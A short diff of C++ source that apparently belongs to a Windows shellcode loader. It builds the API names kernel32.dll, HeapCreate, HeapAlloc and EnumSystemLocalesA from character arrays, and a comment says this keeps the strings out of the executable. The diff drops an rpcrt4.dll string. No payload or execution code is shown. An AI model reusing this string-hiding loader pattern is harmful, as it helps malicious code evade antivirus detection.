@@ -97,7 +97,6 @@ int main() {
 
     //Using char array to avoid full strings in executable
     std::wstring sKernel32 = { 'k','e','r','n','e','l','3','2','.','d','l','l'};
-    unsigned char sRpcrt4[] = {'r','p','c','r','t','4','.','d','l','l',0x0};
     unsigned char sHeapCreate[] = {'H','e','a','p','C','r','e','a','t','e',0x0};
     unsigned char sHeapAlloc[] = {'H','e','a','p','A','l','l','o','c',0x0};
     unsigned char sEnumSystemLocales[] = {'E','n','u','m','S','y','s','t','e','m','L','o','c','a','l','e','s','A',0x0};
